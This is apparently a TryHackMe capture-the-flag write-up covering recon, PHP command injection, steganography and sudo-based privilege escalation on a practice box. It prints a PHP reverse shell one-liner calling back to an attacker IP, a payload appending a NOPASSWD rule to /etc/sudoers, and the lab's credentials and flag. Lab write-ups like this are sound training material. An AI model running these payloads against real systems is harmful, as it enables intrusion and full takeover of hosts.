
---
# 1. Overview

```
- Platform - Tryhackme
- Difficulty - Easy
- Operating System - Linux
- Skills Learned - Privilege Escalation
```

---
# 2. Reconnaissance 

## - Nmap result

```
nmap -sC -sV -A -O 10.49.143.204    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-29 17:32 IST
Nmap scan report for 10.49.143.204
Host is up (0.031s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:34:e2:6d:70:19:d2:78:87:03:ad:7e:14:cf:31:7a (RSA)
|   256 90:5f:e3:6d:67:3f:2a:44:e4:6d:e7:98:92:e3:79:04 (ECDSA)
|_  256 f2:d9:0d:77:65:da:5c:0f:68:e7:40:14:6a:a4:7c:cb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/29%OT=22%CT=1%CU=37954%PV=Y%DS=3%DC=T%G=Y%TM=6AE336
OS:89%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=101%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=10A%TI=Z
OS:%CI=Z%TS=A)SEQ(SP=FD%GCD=2%ISR=110%TI=Z%CI=Z%TS=A)SEQ(SP=FF%GCD=1%ISR=10
OS:6%TI=Z%CI=Z%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8NNT11NW7%O4=M4
OS:E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3
OS:%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC=Y%Q=)T1(R=Y%DF
OS:=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G
OS:%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   43.22 ms 192.168.128.1
2   ...
3   43.46 ms 10.49.143.204

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 175.78 seconds
```

```
- There is one http server is running on port 80 so after visiting i got this site.
```

![[Pasted image 20261029175042.png]]

```
- So tried to run gobuster on this site for directory discovery.
```

## - Gobuster result

```
gobuster dir -u "http://10.49.143.204/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x js,php,txt,html,git
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.143.204/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              js,php,txt,html,git
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1988]
/contact.html         (Status: 200) [Size: 2056]
/about.html           (Status: 200) [Size: 2542]
/assets               (Status: 301) [Size: 315] [--> http://10.49.143.204/assets/]
/courses.html         (Status: 200) [Size: 2580]
/admissions.html      (Status: 200) [Size: 2573]
/server-status        (Status: 403) [Size: 278]
Progress: 1323348 / 1323348 (100.00%)
===============================================================
Finished
===============================================================
```

```
- After further recon there is one interesting directory /asset
- so again i ran gobuster for further recon of this directory.
```

```
gobuster dir -u "http://10.49.143.204/assets/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x js,php,txt,html,git
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.143.204/assets/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              git,js,php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 322] [--> http://10.49.143.204/assets/images/]
/index.php            (Status: 200) [Size: 0]
Progress: 1323348 / 1323348 (100.00%)
===============================================================
Finished
===============================================================
```

```
- I got this /image directory.
- On this site i tried to run php cmd command as the site was written in php -        http://10.49.143.204/assets/index.php?cmd=ls
```

# 3. Initial Access

![[Pasted image 20261029180425.png]]

```
- it showed me this. in the end there are 2 equal to sign which means it is base64 encoded. so i try to decode it
  images
  index.php
  styles.css
  
- I got this answer so there is a clue in image.

- as the php is executable so i tried to get reverse shell using python command for reverse shell.
  
php -r '%24sock%3Dfsockopen("192.168.131.194"%2C9001)%3Bexec("sh <%263 >%263 2>%263")%3B'
  
- So first i started a listener and pasted this payload on php site
```

![[Pasted image 20261029201403.png]]

![[Pasted image 20261029201507.png]]

```
- After some investigation i got this image file 
- So i downloaded it to my main machine using wget command
  wget http://10.49.143.204/assets/images/oneforall.jpg -O oneforall.jpg
- so when i tried to open the file it wad not opening due to some error
```

![[Pasted image 20261029202312.png]]

```
- After some further investigation i got see that image is corrupt and its PNG not jpg using XXD command so we need to correct it using one github tool i know which is - MagicBytes
```

![[Pasted image 20261029203714.png]]

![[Pasted image 20261029203802.png]]

![[Pasted image 20261029203812.png|700]]

```
- After this i got a cool image and also there is clue in this image so used steghide for investigation.
  
steghide extract -sf oneforall.jpg                   
Enter passphrase: 

- But it asked for passphrase so i more dig into shell and got the passphrase which was base64 encoded.
```

![[Pasted image 20261029203925.png]]

![[Pasted image 20261029204322.png]]

```
- Encoded base64 - QWxsbWlnaHRGb3JFdmVyISEhCg==
- Decoded base64 - AllmightForEver!!!
```

![[Pasted image 20261029204512.png]]

```
- After entering the passphrase we got a creds.txt. I guess we got user for ssh and password for it.
```
# 4. Privilege Escalation

![[Pasted image 20261029204743.png]]

```
- We got the ssh connection now we can try to get privilege escalation
- Also we got our first flag - THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
```

![[Pasted image 20261029204932.png]]

```
- In order to get root access first command i ran is "sudo -l" and got this answer.
  
deku@ip-10-49-143-204:~$ sudo -l
[sudo] password for deku: (For password i used ssh password(One?For?All_!!one1/A))
Matching Defaults entries for deku on ip-10-49-143-204:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on ip-10-49-143-204:
    (ALL) /opt/NewComponent/feedback.sh
deku@ip-10-49-143-204:~$ 
```

![[Pasted image 20261029205341.png]]

```
- I dont much about used bash scripting so i used chatgpt for this and got to know that there is eval command which executes commands for us so i entered a malicious payload - deku ALL=NOPASSWD: ALL >> /etc/sudoers
```

![[Pasted image 20261029210150.png]]

```
- Hence we got the root access and got the flag
```

---
# 5. Key Findings

```
- Hidden directories with executable php for reverse shell.
- Images holding hidden data
- Root privileges
- Reverse shell
- SSH connection
```

---
# 6. Tools Used

```
- Nmap
- Gobuster
- Steghide
- MagicBytes githb repo for image repair
- XXD
```

---
